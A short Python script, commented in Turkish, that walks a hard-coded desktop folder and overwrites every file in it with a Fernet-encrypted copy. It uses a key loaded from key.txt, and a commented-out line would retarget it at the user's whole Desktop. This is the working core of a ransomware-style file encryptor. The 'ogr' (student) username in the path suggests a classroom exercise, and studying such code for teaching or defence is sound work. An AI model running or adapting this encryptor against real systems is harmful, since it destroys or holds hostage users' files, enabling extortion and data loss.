#bilgisayar klasöründeki bütün dosyalar şifrelenecek. 
import os
from cryptography.fernet import Fernet

def keyUret():
        key=Fernet.generate_key()  #Key üret
        with open("key.txt","wb") as keyDosyasi:  #Keyi unutmamak için dosyaya kaydet
            keyDosyasi.write(key)
    #keyUret()

def dosyaAc(dosya):
        with open(dosya,"rb") as dosyam:
            return dosyam.read()  #Keyi daha sonra kullanmak için keyi oku

key = dosyaAc("key.txt") 

#adres=os.path.join(os.path.join(os.environ['USERPROFILE']), 'Desktop')
#for kok,altdizin,dosya in os.walk(adres):


for kok,altdizin,dosya in os.walk("C:/Users/ogr_8/Desktop/bilgisayar"):         
    for i in dosya:
        path=(kok+"/"+i)
        newPath = path.replace(os.sep, '/')
        print(newPath)


        def sifrele(dosyalar,key):
            içerik=dosyaAc(dosyalar)
            f=Fernet(key)
            şifreliiçerik=f.encrypt(içerik)
            with open(dosyalar,"wb") as dosyalar:
                dosyalar.write(şifreliiçerik)
    
        sifrele(newPath,key)

    
